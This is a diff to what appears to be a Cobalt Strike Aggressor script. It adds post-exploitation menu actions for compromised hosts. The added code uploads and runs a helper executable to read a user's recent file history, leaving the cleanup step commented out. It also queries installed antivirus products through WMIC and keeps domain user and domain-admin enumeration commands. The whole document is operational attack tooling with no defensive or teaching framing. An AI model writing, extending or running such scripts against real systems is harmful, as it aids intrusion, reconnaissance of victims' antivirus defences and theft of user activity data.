@@ -2,8 +2,10 @@ sub Ladon{
 
     bpowerpick($bid,"Ladon $3['command']");
 }
-sub domain{
-
+sub recentqueryfunc{
+    bupload($bid, script_resource("bin/openfilehistory.exe"));
+    bshell($bid, "openfilehistory.exe $3['username']");
+    #brm($bid,"openfilehistory.exe");
 }
 
 menu "扫描分析"{
@@ -14,7 +16,9 @@ menu "扫描分析"{
     }
     item "杀毒检测-wmic"{
         foreach $id ($1){
-            bshell($1, "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list")
+            bshell($id, "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list");
+            bshell($id, "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct");
+
         }
     }
     
@@ -49,11 +53,15 @@ menu "扫描分析"{
             bshell($id, "net user /domain && wmic useraccount get /all && dsquery user && net group \"domain admins\" /domain");
         }
     }
-    item "查询安装的软件" {
-        foreach $id ($1) {
-            bpowershell($id, "Get-WmiObject -class Win32_Product | Select-Object -Property name,version")
-        }
+    item "最近使用痕迹" {
+        $bid = $1;
+        $dialog = dialog("最近使用痕迹查询", %(username => "Administrator", bid => $id), &recentqueryfunc);
+        dialog_description($dialog, "要查询的用户名输入");
+        drow_text($dialog, "username", "USERNAME:");
+        dbutton_action($dialog, "run");
+        dialog_show($dialog);
     }
+    
     # menu "Ladon"{
     #     item "加载Ladon"{
     #         $bid = $1;
@@ -67,7 +75,6 @@ menu "扫描分析"{
     #         dbutton_action($dialog, "Send");
     #         dialog_show($dialog);
     #     }
-        
     # }
     item "test"{
         if(-is64 $1)
